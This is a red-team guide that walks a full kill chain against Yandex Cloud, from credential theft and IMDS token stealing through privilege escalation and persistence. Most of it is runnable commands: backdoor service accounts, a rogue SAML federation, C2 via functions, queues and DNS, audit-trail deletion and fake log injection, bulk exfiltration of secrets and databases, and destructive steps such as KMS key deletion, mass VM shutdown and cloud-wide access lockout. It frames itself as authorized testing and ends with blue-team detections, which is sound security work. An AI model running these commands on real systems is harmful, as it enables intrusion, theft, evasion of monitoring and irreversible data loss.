# Yandex Cloud Penetration Testing Guide

> A kill-chain walkthrough for authorized red team engagements against Yandex Cloud environments.
> Built from 220+ TTPs across 21 Yandex Cloud services.

---

## Table of Contents

1. [Rules of Engagement](#1-rules-of-engagement)
2. [Attack Phases Overview](#2-attack-phases-overview)
3. [Phase 0 — Pre-Engagement Reconnaissance](#3-phase-0--pre-engagement-reconnaissance)
4. [Phase 1 — Initial Access](#4-phase-1--initial-access)
5. [Phase 2 — Discovery & Enumeration](#5-phase-2--discovery--enumeration)
6. [Phase 3 — Privilege Escalation](#6-phase-3--privilege-escalation)
7. [Phase 4 — Lateral Movement](#7-phase-4--lateral-movement)
8. [Phase 5 — Persistence](#8-phase-5--persistence)
9. [Phase 6 — Defense Evasion](#9-phase-6--defense-evasion)
10. [Phase 7 — Data Exfiltration](#10-phase-7--data-exfiltration)
11. [Phase 8 — Impact (Destructive Objectives)](#11-phase-8--impact-destructive-objectives)
12. [Attack Playbooks](#12-attack-playbooks)
13. [Quick Reference — Critical Roles to Hunt](#13-quick-reference--critical-roles-to-hunt)
14. [Detection Cheat Sheet for Blue Teams](#14-detection-cheat-sheet-for-blue-teams)

---

## 1. Rules of Engagement

This guide is intended **exclusively** for authorized penetration testing engagements, red team exercises, and security research conducted with explicit written permission from the asset owner. Yandex Cloud requires pentest notification — see [Yandex Cloud pentest policy](https://yandex.cloud/docs/overview/compliance/pentest).

Before beginning:
- Obtain signed authorization and scope definition
- Identify in-scope clouds, folders, and services
- Agree on destructive-action boundaries (Phase 8 techniques require explicit approval)
- Establish communication channels for emergency stop
- Confirm audit trail monitoring expectations with the blue team

---

## 2. Attack Phases Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    YANDEX CLOUD KILL CHAIN                      │
│                                                                 │
│  ┌──────────┐   ┌───────────┐   ┌──────────┐   ┌───────────┐  │
│  │ INITIAL  │──▶│ DISCOVERY │──▶│ PRIVESC  │──▶│  LATERAL  │  │
│  │ ACCESS   │   │ & ENUM    │   │          │   │  MOVEMENT │  │
│  └──────────┘   └───────────┘   └──────────┘   └───────────┘  │
│       │                                              │         │
│       │         ┌───────────┐   ┌──────────┐         │         │
│       │         │ DEFENSE   │◀──│PERSISTENCE│◀────────┘         │
│       │         │ EVASION   │   │          │                   │
│       │         └───────────┘   └──────────┘                   │
│       │              │                                         │
│       ▼              ▼                                         │
│  ┌──────────┐   ┌───────────┐                                  │
│  │  DATA    │   │  IMPACT   │                                  │
│  │ EXFIL    │   │(destruct.)│                                  │
│  └──────────┘   └───────────┘                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3. Phase 0 — Pre-Engagement Reconnaissance

Before touching any Yandex Cloud API, gather intelligence passively.

### 3.1 Public DNS Footprinting

Yandex Cloud uses predictable FQDN patterns. Enumerate externally:

| Resource | FQDN Pattern | What It Reveals |
|----------|-------------|-----------------|
| Object Storage | `<bucket>.storage.yandexcloud.net` | Bucket names, static websites |
| CDN | `<id>.gcdn.co` | CDN resource IDs |
| API Gateway | `<id>.apigw.yandexcloud.net` | Gateway IDs, OpenAPI specs |
| Managed DB (PG) | `<cluster-id>.mdb.yandexcloud.net` | Cluster IDs, host roles |
| ALB | Public IPs via DNS resolution | Load balancer endpoints |
| Cloud Functions | `functions.yandexcloud.net/<id>` | Public function IDs |
| Container Registry | `cr.yandex/<registry-id>` | Registry IDs |

### 3.2 Public Bucket & Registry Discovery

```bash
# Attempt anonymous bucket listing
aws s3 ls s3://<target-bucket> --endpoint-url https://storage.yandexcloud.net --no-sign-request

# Attempt anonymous container image pull
docker pull cr.yandex/<registry-id>/<image>:<tag>
```

### 3.3 Certificate Transparency Logs

Search CT logs for `*.yandexcloud.net` subdomains and any custom domains with Yandex Cloud Let's Encrypt certificates — these reveal API Gateways, ALBs, and CDN resources.

### 3.4 GitHub / GitLab Dorking

Search for leaked credentials:
- `yc iam create-token` in shell history
- Static access keys (`YC...` patterns)
- Authorized key JSON files (`service_account_id`, `key_algorithm`)
- `.env` files with `YC_TOKEN`, `YC_SERVICE_ACCOUNT_KEY_FILE`
- Terraform state files containing Lockbox secret values in plaintext

---

## 4. Phase 1 — Initial Access

### 4.1 Stolen Credentials

**Priority targets** (ordered by impact):

| Credential Type | Lifetime | Where Found | Technique Reference |
|----------------|----------|-------------|-------------------|
| OAuth token | 12 hours (cookie: 1 year) | Browser cookies, CI logs | `iam.md` |
| Authorized key (JSON) | **Unlimited** | Git repos, CI/CD configs, disk images | `iam.md` |
| Static access key (AWS-style) | **Unlimited** | `.env` files, app configs | `iam.md` |
| API key | **Unlimited** | App source code, env vars | `iam.md` |
| IAM token (short-lived) | 12 hours | IMDS, SSRF responses, logs | `compute.md`, `serverless.md` |
| Refresh token | 31 days (auto-renews) | Token store files | `iam.md` |
| Kubeconfig (static) | **Unlimited** (SA token) | Developer machines, CI secrets | `kubernetes.md` |
| Database passwords | Until rotated | Lockbox, Data Transfer endpoints, env vars | `managed-databases.md`, `data-transfer.md` |

### 4.2 SSRF to IMDS

If you find an SSRF vulnerability in any Yandex Cloud workload (VM, function, container), the metadata service is your first target:

```
# From inside a VM (or via SSRF)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# From inside a Cloud Function
# The runtime provides context.token directly — no SSRF needed
```

The returned IAM token inherits **all roles** bound to the workload's service account. This is often the single most impactful initial access vector.

### 4.3 SAML Federation Abuse

If the target uses a federated identity provider:
- Compromise the IdP to mint arbitrary SAML assertions
- If `auto_create_account_on_login` is enabled (check via `yc organization-manager federation saml get`), any valid SAML assertion creates a new cloud account automatically
- Federated users can be pre-granted roles before they even log in

### 4.4 Exposed Serverless Endpoints

```bash
# Public Cloud Functions (no auth required if flag is set)
curl https://functions.yandexcloud.net/<function-id>

# Public Serverless Containers
curl https://<container-id>.containers.yandexcloud.net

# API Gateway — enumerate routes from OpenAPI spec
yc serverless api-gateway get --name <name> --format json | jq '.openapi_spec'
```

### 4.5 Dangling DNS Takeover

If a target's CNAME points to a deleted Yandex Cloud resource (Object Storage bucket, CDN, API Gateway), claim the resource name:

```bash
# Check for dangling CNAMEs
dig target-cdn.example.com CNAME
# If it resolves to *.gcdn.co or *.storage.yandexcloud.net but returns 404/NoSuchBucket:
# Register the resource name under your own Yandex Cloud account
```

---

## 5. Phase 2 — Discovery & Enumeration

Once you have *any* valid credential, enumerate everything reachable. The goal is to map the blast radius.

### 5.1 Identity & Hierarchy Mapping

```bash
# Who am I?
yc iam whoami

# Map the hierarchy
yc organization-manager organization list
yc resource-manager cloud list
yc resource-manager folder list --cloud-id <cloud-id>

# What can I do? Check access bindings at every level
yc resource-manager folder list-access-bindings --id <folder-id>
yc resource-manager cloud list-access-bindings --id <cloud-id>
yc organization-manager organization list-access-bindings --id <org-id>
```

### 5.2 Service Account Inventory

Service accounts are the skeleton keys of Yandex Cloud. Map all of them:

```bash
# List all SAs in a folder
yc iam service-account list --folder-id <folder-id>

# For each SA, enumerate keys
yc iam key list --service-account-id <sa-id>           # Authorized keys
yc iam api-key list --service-account-id <sa-id>       # API keys
yc iam access-key list --service-account-id <sa-id>    # Static access keys (S3/SQS)

# Find SAs attached to compute instances
yc compute instance list --format json | jq '.[] | {name, service_account_id}'

# Find SAs attached to serverless functions
yc serverless function list --format json | jq '.[] | {name, service_account_id}'

# Find SAs attached to Kubernetes clusters
yc k8s cluster list --format json | jq '.[] | {name, service_account_id, node_service_account_id}'
```

### 5.3 Network Topology

```bash
# VPC layout
yc vpc network list
yc vpc subnet list --format json | jq '.[] | {name, zone, v4_cidr_blocks, network_id}'

# Security groups (firewall rules)
yc vpc security-group list --format json | jq '.[] | {name, id, rules}'

# Public IPs
yc vpc address list

# NAT gateways (egress points)
yc vpc gateway list

# Route tables (traffic paths)
yc vpc route-table list --format json | jq '.[] | {name, static_routes}'

# DNS zones (internal names)
yc dns zone list
yc dns zone list-records --name <zone-name>
```

### 5.4 Secrets & Credentials Harvesting

```bash
# Lockbox secrets (metadata — can you read them?)
yc lockbox secret list
yc lockbox payload get --id <secret-id>    # Requires lockbox.payloadViewer

# KMS keys (can you decrypt things?)
yc kms symmetric-key list

# Data Transfer endpoints (may contain DB passwords in plaintext)
yc datatransfer endpoint list --format json
yc datatransfer endpoint get --id <endpoint-id>  # Check connection settings

# Certificate Manager (can you download private keys?)
yc certificate-manager certificate list
yc certificate-manager certificate content --id <cert-id>  # Requires .downloader role

# Cloud Logging (search for leaked credentials in logs)
yc logging read --group-id <group-id> --filter 'message : "password" OR message : "token" OR message : "secret"'
```

### 5.5 Compute & Container Inventory

```bash
# All VMs
yc compute instance list --format json | jq '.[] | {name, id, status, network_interfaces, service_account_id, metadata}'

# All disks and snapshots (offline analysis targets)
yc compute disk list
yc compute snapshot list

# Container registries
yc container registry list
yc container repository list --registry-id <reg-id>
yc container image list --repository-name <repo>

# Kubernetes
yc k8s cluster list
kubectl get secrets --all-namespaces  # After obtaining kubeconfig
```

### 5.6 Serverless & Event Architecture

```bash
# Functions, containers, triggers
yc serverless function list
yc serverless container list
yc serverless trigger list

# Message queues
aws sqs list-queues --endpoint-url https://message-queue.api.cloud.yandex.net

# API Gateways (OpenAPI specs reveal full backend topology)
yc serverless api-gateway list
yc serverless api-gateway get-spec --id <gw-id>
```

### 5.7 Monitoring & Audit Posture

Understanding what's being watched tells you where the blind spots are:

```bash
# Audit Trails — what's being logged?
yc audit-trails trail list
yc audit-trails trail get --name <trail-name>  # Check scope, filters, destination

# Cloud Logging — where do logs go?
yc logging group list
yc logging sink list

# SmartWebSecurity — what's protected?
yc smartwebsecurity security-profile list
```

---

## 6. Phase 3 — Privilege Escalation

### 6.1 The IAM Escalation Ladder

Yandex Cloud's permission model has several well-known escalation paths:

```
┌─────────────────────────────────────────────────────────────┐
│                  PRIVILEGE ESCALATION PATHS                  │
│                                                             │
│  iam.serviceAccounts.tokenCreator                           │
│  └─▶ Impersonate ANY SA in scope (generate IAM tokens)     │
│                                                             │
│  iam.serviceAccounts.keyAdmin                               │
│  └─▶ Create authorized keys for ANY SA (permanent access)  │
│                                                             │
│  iam.serviceAccounts.admin                                  │
│  └─▶ Create new SAs, then grant them any role you hold     │
│                                                             │
│  compute.editor                                             │
│  └─▶ Attach high-privilege SA to your VM → steal token     │
│                                                             │
│  editor (at folder/cloud level)                             │
│  └─▶ Inherits editor on ALL resources below                │
│                                                             │
│  storage.configurer                                         │
│  └─▶ Rewrite bucket policy to grant yourself full access   │
│                                                             │
│  admin (at any level)                                       │
│  └─▶ Grant yourself ANY role via set-access-bindings       │
│                                                             │
│  resource-manager.clouds.owner                              │
│  └─▶ Supreme privilege — full control over everything      │
└─────────────────────────────────────────────────────────────┘
```

### 6.2 Service Account Impersonation

The most powerful escalation: `iam.serviceAccounts.tokenCreator`

```bash
# Find a high-value SA
yc iam service-account list --folder-id <folder-id>

# Generate an IAM token as that SA
yc iam create-token --service-account-id <target-sa-id>

# Or create a permanent authorized key
yc iam key create --service-account-id <target-sa-id> -o key.json
```

### 6.3 Compute Metadata Escalation

If you have `compute.editor`:

```bash
# Option A: Attach a powerful SA to a VM you control
yc compute instance update <instance-id> --service-account-id <powerful-sa-id>
# Then from inside the VM:
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Option B: Inject SSH key via metadata
yc compute instance add-metadata <instance-id> --metadata "ssh-keys=attacker:ssh-rsa AAAA..."

# Option C: Enable serial console for out-of-band access
yc compute instance add-metadata <instance-id> --metadata "serial-port-enable=1"
```

### 6.4 Kubernetes Escalation

```bash
# If you have k8s.editor → maps to K8s 'edit' ClusterRole
# Steal service account tokens from pods:
kubectl get secrets -A -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {namespace: .metadata.namespace, name: .metadata.name}'

# The cluster service account often has broad cloud-level permissions
# Escape to cloud via metadata service from a pod:
kubectl run probe --image=curlimages/curl --rm -it --restart=Never -- \
  curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### 6.5 Cross-Service Escalation Chains

**Chain 1: Data Transfer → Database Admin**
```
data-transfer.viewer → Read endpoint configs → Extract DB passwords → Direct DB access
```

**Chain 2: Serverless → Cloud-wide**
```
functions.editor → Deploy function with SA token theft → Impersonate the function's SA → Access whatever the SA can reach
```

**Chain 3: Object Storage → Code Execution**
```
storage.editor → Replace function source code in S3 bucket → Next function invocation runs attacker code with function's SA
```

**Chain 4: Certificate Manager → MITM**
```
certificate-manager.admin → Replace TLS certificate → Intercept traffic at ALB/CDN/API Gateway
```

---

## 7. Phase 4 — Lateral Movement

### 7.1 Network Pivoting

```bash
# Open security group rules to allow lateral movement
yc vpc security-group update-rules <sg-id> --add-rule "direction=ingress,port=22,protocol=tcp,v4-cidrs=<attacker-ip>/32"

# Assign public IP to internal-only VM
yc compute instance add-one-to-one-nat <instance-id> --network-interface-index 0

# Route table hijack — redirect traffic through your VM
yc vpc route-table update <rt-id> --route destination=10.0.0.0/8,next-hop=<your-vm-ip>

# DNS hijack for internal service discovery
yc dns zone add-records --name <private-zone> --record "<internal-service> A <your-vm-ip>"
```

### 7.2 Load Balancer Traffic Interception

```bash
# Inject attacker backend into ALB backend group
yc alb backend-group update-http-backend --name <bg> \
  --http-backend-name attacker-backend \
  --target-group-id <attacker-tg-id> \
  --weight 1

# Route injection — catch-all route to intercept unmatched traffic
yc alb virtual-host append-http-route --name catch-all \
  --virtual-host-name <vh> --http-router-name <router> \
  --prefix-path-match "/" --backend-group-name <attacker-bg>
```

### 7.3 API Gateway as a Pivot

An API Gateway with VPC access can reach internal services:

```yaml
# Inject a proxy route into the OpenAPI spec
/proxy/{path+}:
  x-yc-apigateway-integration:
    type: http
    url: http://10.0.0.0/{path}  # Internal network target
    timeouts:
      read: 30s
```

### 7.4 Cross-Folder Movement

```bash
# If your SA has roles at the cloud level, you can access ALL folders:
yc resource-manager folder list --cloud-id <cloud-id>

# Check for high-privilege SAs in forgotten/dev folders:
for folder in $(yc resource-manager folder list --cloud-id <cloud-id> --format json | jq -r '.[].id'); do
  echo "=== Folder: $folder ==="
  yc iam service-account list --folder-id $folder
done
```

### 7.5 Database Hopping

```bash
# Enable public access on a private database host
yc managed-postgresql hosts update <hostname> --cluster-name <cluster> --assign-public-ip

# Use dblink/postgres_fdw (if mdb_admin) to reach other databases
# From inside a PostgreSQL session:
# SELECT * FROM dblink('host=<other-cluster> dbname=prod user=admin password=...', 'SELECT * FROM users') AS t(...)
```

---

## 8. Phase 5 — Persistence

### 8.1 Identity Persistence (Survive Credential Rotation)

```bash
# Create a backdoor service account with an innocuous name
yc iam service-account create --name logging-metrics-collector --folder-id <folder-id>
yc resource-manager folder add-access-binding --id <folder-id> \
  --role editor --subject serviceAccount:<new-sa-id>
yc iam key create --service-account-id <new-sa-id> -o backdoor-key.json

# Create unlimited-lifetime authorized key for existing SA
yc iam key create --service-account-id <target-sa-id> -o persistent-key.json
# This key never expires and survives token rotation

# Static access key (for S3/SQS — also never expires)
yc iam access-key create --service-account-id <sa-id>
```

### 8.2 Federation Backdoor

```bash
# Create a rogue SAML federation pointing to attacker-controlled IdP
yc organization-manager federation saml create \
  --name "backup-sso" \
  --organization-id <org-id> \
  --issuer "https://attacker-idp.example.com" \
  --sso-url "https://attacker-idp.example.com/sso" \
  --sso-binding POST \
  --auto-create-account-on-login

# Grant the federated user admin
yc resource-manager cloud add-access-binding --id <cloud-id> \
  --role admin --subject federatedUser:<attacker-fed-user-id>
```

### 8.3 Serverless Callbacks (C2)

```bash
# Deploy a timer-triggered function that beacons to attacker C2
yc serverless function create --name health-check-monitor --folder-id <folder-id>
yc serverless function version create \
  --function-name health-check-monitor \
  --runtime python312 \
  --entrypoint main.handler \
  --source-path ./c2_beacon.zip \
  --service-account-id <sa-id> \
  --execution-timeout 30s

# Create cron trigger (every 5 minutes)
yc serverless trigger create timer \
  --name scheduled-health-check \
  --cron-expression "*/5 * * * ? *" \
  --invoke-function-name health-check-monitor \
  --invoke-function-service-account-id <sa-id>
```

### 8.4 Message Queue C2 Channel

```bash
# Create a queue as a command-and-control channel
aws sqs create-queue --queue-name error-dlq-processor \
  --endpoint-url https://message-queue.api.cloud.yandex.net \
  --attributes '{"MessageRetentionPeriod": "1209600"}'

# Attacker sends commands via messages; implant polls and executes
```

### 8.5 Kubernetes Persistence

```bash
# Deploy a DaemonSet that runs on every node (survives pod restarts)
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-log-collector
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: node-log-collector
  template:
    metadata:
      labels:
        app: node-log-collector
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: collector
        image: cr.yandex/<your-registry>/log-collector:latest
        securityContext:
          privileged: true
EOF
```

### 8.6 Compute Persistence

```bash
# SSH key injection (survives reboots)
yc compute instance add-metadata <instance-id> \
  --metadata "ssh-keys=maintenance:ssh-rsa AAAA..."

# Serial console backdoor
yc compute instance add-metadata <instance-id> \
  --metadata "serial-port-enable=1"

# Snapshot schedule (periodic offline copies)
yc compute snapshot-schedule create --name weekly-audit-backup \
  --schedule-policy "recurrence=FREQ=WEEKLY;BYDAY=SU" \
  --disk-ids <target-disk-id> \
  --retention-period 168h
```

### 8.7 DNS C2

```bash
# Use TXT records for command storage
yc dns zone add-records --name <zone> \
  --record "cmd.internal. TXT \"base64-encoded-command-here\""

# Implant resolves cmd.internal, decodes, and executes
```

### 8.8 Subtle WAF Bypass Persistence

```bash
# Enable dry_run on WAF rules — they log but never block
yc smartwebsecurity security-profile update --id <profile-id> \
  --security-rules-file rules-with-dryrun.json
# Each rule has "dry_run": true — appears active in the UI but enforces nothing
```

---

## 9. Phase 6 — Defense Evasion

### 9.1 Blind the Audit Trail

```bash
# Option 1: Delete the audit trail entirely
yc audit-trails trail delete --name <trail-name>

# Option 2: Narrow the scope (only log a single unimportant folder)
yc audit-trails trail update --name <trail-name> \
  --filter-some-folder-ids <unimportant-folder-id>

# Option 3: Disable data plane events (keeps management events but loses data access logs)
yc audit-trails trail update --name <trail-name> --filter '...'

# Option 4: Corrupt the log destination
aws s3 rm s3://<audit-bucket>/ --recursive \
  --endpoint-url https://storage.yandexcloud.net
```

### 9.2 Suppress Monitoring Alerts

```bash
# Delete alert channels
yc monitoring ... # Adjust thresholds or delete notification channels

# Raise anomaly thresholds on SmartWebSecurity WAF
# (via REST API — no CLI)
curl -X PATCH "https://smartwebsecurity.api.cloud.yandex.net/smartwebsecurity/v1/wafProfiles/<profile-id>" \
  -H "Authorization: Bearer <token>" \
  -d '{"updateMask": "analyzeRequestBody.sizeLimit,coreRuleSet.anomalyThreshold", "coreRuleSet": {"anomalyThreshold": 10000}}'
```

### 9.3 Exploit Logging Gaps

Known blind spots in Yandex Cloud logging:

| Blind Spot | Why It Matters |
|-----------|----------------|
| IMDS token theft | Not logged in Audit Trails at all |
| Data plane events (S3 reads, DB queries) | Disabled by default — must be opted in |
| SmartWebSecurity `dry_run` changes | Logged as normal update — no special flag |
| VPC security group modifications | Logged but often not alerted on |
| Lockbox secret reads | Only logged if data events are enabled |
| Cloud Function environment variables | Reading env vars inside function is invisible |
| K8s in-cluster API calls | Not in cloud audit trail — only in K8s audit logs |
| `set-access-bindings` vs `update-access-bindings` | set replaces ALL bindings — may not trigger per-binding alerts |

### 9.4 Timestamp Manipulation

```bash
# Cloud Logging entries can be injected with arbitrary timestamps
# Use this to bury malicious log entries in old timeframes
yc logging write --group-id <group-id> \
  --message "Routine health check completed" \
  --timestamp "2024-01-15T03:00:00Z" \
  --level INFO
```

---

## 10. Phase 7 — Data Exfiltration

### 10.1 Object Storage

```bash
# Direct download (if you have storage.viewer/editor)
aws s3 sync s3://<target-bucket> ./exfil/ \
  --endpoint-url https://storage.yandexcloud.net

# Enable static website hosting for public exfil drop
yc storage bucket update <bucket> --website-settings '{"index": "index.html"}'
```

### 10.2 Database Exfiltration

```bash
# Method 1: Restore backup to attacker-controlled cluster
yc managed-postgresql cluster restore --backup-id <backup-id> \
  --name exfil-cluster --network-id <attacker-network>

# Method 2: Data Transfer replication
yc datatransfer endpoint create ... # Point source to target DB, destination to external
yc datatransfer transfer create --type SNAPSHOT_AND_INCREMENT ...

# Method 3: Enable public access + direct connection
yc managed-postgresql hosts update <host> --cluster-name <c> --assign-public-ip
psql "host=<public-fqdn> dbname=prod user=<user> password=<pwd>" -c "COPY users TO STDOUT CSV" > exfil.csv
```

### 10.3 Backup Restoration

```bash
# Compute snapshots → create new disk → mount and copy
yc compute snapshot list
yc compute disk create --name analysis --snapshot-id <snap-id>
yc compute instance attach-disk <your-vm> --disk-name analysis
# SSH in, mount, and copy interesting files

# Backup service — file-by-file recovery
yc backup ... # Restore individual files from backup archives
```

### 10.4 Lockbox & KMS Secrets

```bash
# Bulk exfiltrate all Lockbox secrets
for secret_id in $(yc lockbox secret list --format json | jq -r '.[].id'); do
  echo "=== Secret: $secret_id ==="
  yc lockbox payload get --id $secret_id 2>/dev/null
done
```

### 10.5 Serverless Exfiltration Tunnel

```bash
# Deploy a function that reads internal resources and posts to attacker endpoint
# The function's SA may have access to VPC-internal databases, storage, etc.
# Each invocation is ephemeral — minimal forensic footprint
```

### 10.6 Container Image Theft

```bash
# Pull all images from the registry
for repo in $(yc container repository list --registry-id <reg-id> --format json | jq -r '.[].name'); do
  docker pull cr.yandex/$repo:latest
done
# Images often contain embedded secrets, configs, and proprietary code
```

---

## 11. Phase 8 — Impact (Destructive Objectives)

> **WARNING**: These techniques are destructive and potentially irreversible. Only execute with explicit authorization and within agreed scope.

### 11.1 Cryptographic Destruction (Nuclear Option)

```bash
# Delete a KMS key → ALL data encrypted with it becomes PERMANENTLY unrecoverable
# This affects: Lockbox secrets, Compute disks, S3 objects, K8s secrets
yc kms symmetric-key delete --id <key-id>

# There is no recovery. The scheduled destruction period is the only safety net.
```

### 11.2 Ransomware Simulation

```bash
# Step 1: Enable WORM (Write-Once-Read-Many) on attacker-controlled bucket
# Step 2: Copy target data to WORM bucket
# Step 3: Delete original data
# Step 4: WORM objects cannot be deleted until retention expires
# This demonstrates data held hostage without encryption
```

### 11.3 Service-Wide Disruption

```bash
# Compute: stop all VMs
for vm in $(yc compute instance list --format json | jq -r '.[].id'); do
  yc compute instance stop $vm
done

# Kubernetes: delete all workloads
kubectl delete deployments,statefulsets,daemonsets --all --all-namespaces

# Load Balancers: stop all ALBs
for alb in $(yc alb load-balancer list --format json | jq -r '.[].id'); do
  yc alb load-balancer stop $alb
done

# DNS: delete all records (breaks all name resolution)
yc dns zone list-records --name <zone> | while read record; do
  yc dns zone delete-records --name <zone> --record "$record"
done

# SmartWebSecurity: remove all WAF protection
yc smartwebsecurity security-profile delete --id <profile-id>
```

### 11.4 Access Lockout

```bash
# Replace ALL access bindings at cloud level (removes everyone except attacker)
yc resource-manager cloud set-access-bindings --id <cloud-id> \
  --access-binding "role=admin,subject=serviceAccount:<attacker-sa-id>"
# WARNING: set-access-bindings REPLACES, not appends — all other bindings are deleted

# Delete SAML federation (locks out all federated users)
yc organization-manager federation saml delete --id <federation-id>
```

---

## 12. Attack Playbooks

### Playbook A — "The Silent Observer"

**Objective**: Establish persistent, undetected read access to sensitive data.

```
1. Initial Access: Stolen authorized key from Git repo
2. Enumerate: Map SAs, find one with lockbox.payloadViewer + storage.viewer
3. Impersonate: Use iam.serviceAccounts.tokenCreator to get SA token
4. Exfiltrate: Dump all Lockbox secrets, sync S3 buckets
5. Persist: Create new authorized key for the SA (never expires)
6. Evade: All reads are data-plane events (disabled by default)
7. Cover tracks: No modifications made — nothing to alert on
```

### Playbook B — "The Lateral Architect"

**Objective**: Pivot from a compromised serverless function to cloud-wide access.

```
1. Initial Access: RCE in a Cloud Function via deserialization vulnerability
2. Steal: Extract IAM token from function runtime (context.token)
3. Discover: The function's SA has functions.editor + vpc.user
4. Escalate: Deploy new function version that steals metadata tokens from VPC
5. Pivot: Function's VPC access reaches internal Managed PostgreSQL
6. Discover: Data Transfer endpoint reveals DB credentials in plaintext
7. Exfiltrate: Direct database connection from function's VPC
8. Persist: Timer trigger calls beacon function every 5 minutes
9. Evade: Function invocations generate minimal audit footprint
```

### Playbook C — "The Infrastructure Takeover"

**Objective**: Full cloud compromise from a single compute.editor role.

```
1. Initial Access: Compromised developer workstation with YC CLI configured
2. Enumerate: List all VMs and their service accounts
3. Escalate: Attach admin-level SA to a VM you can access
4. Steal: Curl IMDS for the admin SA's IAM token
5. Enumerate: Map entire org — all clouds, folders, SAs, bindings
6. Persist: Create rogue SAML federation + backdoor SA + authorized keys
7. Move laterally: Open security groups, assign public IPs to internal VMs
8. Exfiltrate: Restore database backups, sync S3 buckets, dump Lockbox
9. Cover: Disable Audit Trail data events, suppress monitoring alerts
```

### Playbook D — "The Supply Chain"

**Objective**: Compromise production workloads via the CI/CD pipeline.

```
1. Initial Access: Container Registry pusher credentials from CI config
2. Attack: Replace latest-tagged production images with backdoored versions
   (Container Registry tags are mutable — no signature verification)
3. Wait: Next deployment pulls the backdoored image
4. Activate: Backdoor steals pod SA tokens, reads K8s secrets
5. Escalate: K8s secrets contain database passwords and API keys
6. Persist: DaemonSet in kube-system namespace runs on every node
7. Exfiltrate: Use External Secrets Operator to read Lockbox secrets
```

### Playbook E — "The Web Application Gateway"

**Objective**: Intercept and manipulate web traffic.

```
1. Initial Access: alb.editor role via compromised SA
2. Reconnaissance: Enumerate HTTP routers, virtual hosts, backend groups
3. Attack: Inject transparent proxy backend (captures all traffic)
4. Escalate: Harvest credentials from intercepted requests
5. Amplify: Disable SmartWebSecurity (dry_run all rules)
6. Amplify: Replace TLS certificate with attacker-controlled one (MITM)
7. Persist: Hidden route on /.well-known/acme-challenge/<c2-path>
8. Persist: SNI catch-all routing to attacker backend
9. Evade: SmartWebSecurity data plane logging not enabled by default
```

---

## 13. Quick Reference — Critical Roles to Hunt

When you compromise *any* identity, immediately check for these high-value roles:

| Role | Why It's Dangerous |
|------|--------------------|
| `admin` (any level) | Can grant any role to anyone |
| `editor` (any level) | Modify all resources in scope |
| `resource-manager.clouds.owner` | Supreme cloud privilege |
| `organization-manager.admin` | Control identity federation, org structure |
| `iam.serviceAccounts.tokenCreator` | Impersonate any SA in scope |
| `iam.serviceAccounts.keyAdmin` | Create permanent keys for any SA |
| `compute.editor` | Attach SAs to VMs, inject SSH keys, enable serial console |
| `lockbox.payloadViewer` | Read all secrets in scope |
| `lockbox.admin` | Read secrets + manage access |
| `kms.keys.encrypterDecrypter` | Decrypt any data encrypted with in-scope keys |
| `certificate-manager.certificates.downloader` | Steal TLS private keys |
| `storage.configurer` | Rewrite bucket policies (self-escalation) |
| `data-transfer.viewer` | May expose database credentials |
| `k8s.cluster-api.cluster-admin` | Full Kubernetes control |
| `container-registry.images.pusher` | Supply chain attacks via image replacement |
| `smart-web-security.editor` | Disable WAF protection |

---

## 14. Detection Cheat Sheet for Blue Teams

If you are using this guide to validate defenses, here are the key things to monitor:

### Must-Have Detections

| Detection | Audit Trail Event | Priority |
|-----------|-------------------|----------|
| New authorized key created | `iam.CreateKey` | CRITICAL |
| New service account created | `iam.CreateServiceAccount` | HIGH |
| Access bindings modified | `*.SetAccessBindings`, `*.UpdateAccessBindings` | CRITICAL |
| Security group rules changed | `vpc.UpdateSecurityGroup` | HIGH |
| Audit trail deleted/modified | `audit-trails.DeleteTrail`, `UpdateTrail` | CRITICAL |
| Lockbox secret read | `lockbox.payload.Get` (data plane) | HIGH |
| SWS profile modified/deleted | `smartwebsecurity.UpdateSecurityProfile` | HIGH |
| KMS key deleted/deactivated | `kms.CancelSymmetricKeyVersionDestruction` | CRITICAL |
| SAML federation created | `organizationmanager.CreateFederation` | CRITICAL |
| Public IP assigned | `compute.UpdateInstance` (check for `one_to_one_nat`) | MEDIUM |
| Container image pushed | `containerregistry.PushImage` | MEDIUM |
| Data Transfer endpoint created | `datatransfer.CreateEndpoint` | MEDIUM |

### Must-Enable Data Plane Events

By default, Yandex Cloud Audit Trails only logs management (control plane) events. Data plane events must be explicitly enabled for:

- **Object Storage** — read/write/delete operations on objects
- **Lockbox** — secret payload reads
- **KMS** — encrypt/decrypt operations
- **DNS** — query logs
- **SmartWebSecurity** — WAF request logs

Without data plane events, an attacker with read-only access generates **zero** audit trail entries.

### Key Blind Spots

1. **IMDS token theft** — completely invisible to Audit Trails
2. **In-cluster Kubernetes API calls** — not forwarded to cloud audit
3. **Cloud Function internal operations** — `context.token` access not logged
4. **Data Transfer credential exposure** — viewing endpoint config is a read operation
5. **Security group "allow all" default** — exists by default, rarely audited

---

## References

All techniques in this guide are sourced from the following TTP documents:

| Document | Service Coverage |
|----------|-----------------|
| [api-gateway.md](api-gateway.md) | API Gateway |
| [audit-trails.md](audit-trails.md) | Audit Trails |
| [backup.md](backup.md) | Cloud Backup |
| [cdn.md](cdn.md) | CDN |
| [certificate-manager.md](certificate-manager.md) | Certificate Manager |
| [cloud-logging-monitoring.md](cloud-logging-monitoring.md) | Cloud Logging & Monitoring |
| [compute.md](compute.md) | Compute Cloud |
| [container-registry.md](container-registry.md) | Container Registry |
| [data-transfer.md](data-transfer.md) | Data Transfer |
| [dns.md](dns.md) | Cloud DNS |
| [iam.md](iam.md) | IAM |
| [kubernetes.md](kubernetes.md) | Managed Kubernetes |
| [load-balancers.md](load-balancers.md) | Network & Application Load Balancers |
| [lockbox-kms.md](lockbox-kms.md) | Lockbox & KMS |
| [managed-databases.md](managed-databases.md) | Managed Databases |
| [message-queue.md](message-queue.md) | Message Queue |
| [object-storage.md](object-storage.md) | Object Storage |
| [organization-resource-manager.md](organization-resource-manager.md) | Organization & Resource Manager |
| [serverless.md](serverless.md) | Serverless (Functions, Containers, Triggers) |
